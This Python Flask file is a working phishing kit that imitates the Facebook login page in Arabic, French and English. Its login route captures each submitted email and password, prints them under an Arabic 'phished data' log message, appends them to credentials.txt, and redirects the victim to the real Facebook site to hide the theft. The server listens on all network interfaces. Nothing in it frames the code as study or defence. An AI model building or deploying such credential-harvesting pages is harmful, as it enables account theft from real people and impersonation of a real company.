from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="{{ lang }}" dir="{{ 'rtl' if lang == 'ar' else 'ltr' }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ t.title }}</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: space-between;
        }
        .lang-bar {
            display: flex;
            justify-content: center;
            gap: 15px;
            padding: 10px;
            font-size: 13px;
            color: #737373;
            background: #f7f8fa;
            border-bottom: 1px solid #e4e6eb;
        }
        .lang-bar a {
            text-decoration: none;
            color: #1877f2;
            font-weight: bold;
        }
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            flex: 1;
            justify-content: center;
        }
        .logo-container {
            margin-bottom: 20px;
            text-align: center;
        }
        .form-box {
            width: 100%;
            max-width: 360px;
            text-align: center;
        }
        .input-group {
            position: relative;
            margin-bottom: 12px;
            width: 100%;
        }
        .form-box input {
            width: 100%;
            padding: 14px 12px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background-color: #f5f6f7;
            outline: none;
            box-sizing: border-box;
        }
        .form-box input:focus {
            border-color: #1877f2;
            background-color: #fff;
        }
        .toggle-btn {
            position: absolute;
            {{ 'left' if lang == 'ar' else 'right' }}: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 13px;
            color: #1877f2;
            background: none;
            border: none;
        }
        .login-btn {
            width: 100%;
            background-color: #1877f2;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            color: white;
            padding: 12px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 5px;
            margin-bottom: 15px;
        }
        .login-btn:active {
            background-color: #166fe5;
        }
        .forgot-link {
            display: block;
            color: #1c1e21;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 30px;
            font-weight: 500;
        }
        .divider {
            border-bottom: 1px solid #dadde1;
            width: 100%;
            margin-bottom: 25px;
        }
        .create-btn {
            display: inline-block;
            width: 80%;
            background-color: transparent;
            border: 1px solid #1877f2;
            border-radius: 25px;
            font-size: 15px;
            color: #1877f2;
            padding: 10px;
            font-weight: bold;
            text-decoration: none;
            box-sizing: border-box;
        }
        .footer {
            text-align: center;
            padding: 15px;
            font-size: 12px;
            color: #737373;
        }
        .footer span {
            font-weight: bold;
            color: #1c1e21;
        }
    </style>
</head>
<body>

    <div class="lang-bar">
        <a href="/?lang=ar">العربية</a>
        <a href="/?lang=fr">Français</a>
        <a href="/?lang=en">English</a>
    </div>
    <div class="main-container">
        <div class="logo-container">
            <svg viewBox="0 0 36 36" class="scb" fill="#1877f2" height="60" width="60"><path d="M25 3.58C22.6 3.2 20.1 3 18 3c-4.1 0-7.3.5-9.9 1.6C5.5 5.8 4 7.6 4 10.2v15.6c0 2.6 1.5 4.4 4.1 5.6C10.7 32.5 13.9 33 18 33c2.1 0 4.6-.2 7-.58V21.5h-3.4v-4.1H25v-3c0-3.5 2.1-5.4 5.3-5.4 1.5 0 2.8.1 3.2.2v3.7h-2.2c-1.7 0-2.3.8-2.3 2.3v2.2h4.2l-.6 4.1H29v11.7C31.5 32 33 30.2 33 27.6V10.2c0-2.6-1.5-4.4-4.1-5.6-2-.9-4.3-1.1-6.4-1.06z"></path></svg>
        </div>

        <div class="form-box">
            <form action="/login?lang={{ lang }}" method="POST">
                <div class="input-group">
                    <input type="text" name="email" placeholder="{{ t.user_ph }}" required>
                </div>
                
                <div class="input-group">
                    <input type="password" name="password" id="password" placeholder="{{ t.pass_ph }}" required>
                    <button type="button" class="toggle-btn" id="toggleBtn" onclick="togglePassword()">{{ t.show }}</button>
                </div>

                <button type="submit" class="login-btn">{{ t.login }}</button>
            </form>

            <a href="#" class="forgot-link">{{ t.forgot }}</a>

            <div class="divider"></div>

            <a href="#" class="create-btn">{{ t.create }}</a>
        </div>
    </div>

    <div class="footer">
        <span>Meta</span> &copy; 2026
    </div>

    <script>
        function togglePassword() {
            var passField = document.getElementById("password");
            var toggleBtn = document.getElementById("toggleBtn");
            if (passField.type === "password") {
                passField.type = "text";
                toggleBtn.textContent = "{{ t.hide }}";
            } else {
                passField.type = "password";
                toggleBtn.textContent = "{{ t.show }}";
            }
        }
    </script>
</body>
</html>
"""

TRANSLATIONS = {
    'ar': {
        'title': 'تسجيل الدخول إلى فيسبوك',
        'user_ph': 'رقم الهاتف المحمول أو البريد الإلكتروني',
        'pass_ph': 'كلمة السر',
        'login': 'تسجيل الدخول',
        'forgot': 'هل نسيت كلمة السر؟',
        'create': 'إنشاء حساب جديد',
        'show': 'إظهار',
        'hide': 'إخفاء'
    },
    'fr': {
        'title': 'Connexion à Facebook',
        'user_ph': 'Mobile ou e-mail',
        'pass_ph': 'Mot de passe',
        'login': 'Se connecter',
        'forgot': 'Mot de passe oublié ?',
        'create': 'Créer nouveau compte',
        'show': 'Afficher',
        'hide': 'Cacher'
    },
    'en': {
        'title': 'Log in to Facebook',
        'user_ph': 'Mobile number or email',
        'pass_ph': 'Password',
        'login': 'Log In',
        'forgot': 'Forgot password?',
        'create': 'Create new account',
        'show': 'Show',
        'hide': 'Hide'
    }
}

@app.route('/')
def home():
    lang = request.args.get('lang', 'ar')
    if lang not in TRANSLATIONS:
        lang = 'ar'
    return render_template_string(HTML_PAGE, lang=lang, t=TRANSLATIONS[lang])

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # التقاط وحفظ البيانات في الملف وفي واجهة الأوامر
    print(f"[+] تم اصطياد البيانات -> الإيميل: {email} | كلمة المرور: {password}")
    with open("credentials.txt", "a", encoding="utf-8") as f:
        f.write(f"Email/Phone: {email} | Password: {password}\n")
    
    # توجيه المستخدم مباشرة إلى موقع فيسبوك الحقيقي
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)                                                                                                                                                                                                                                                                                                                                                                                                                                                       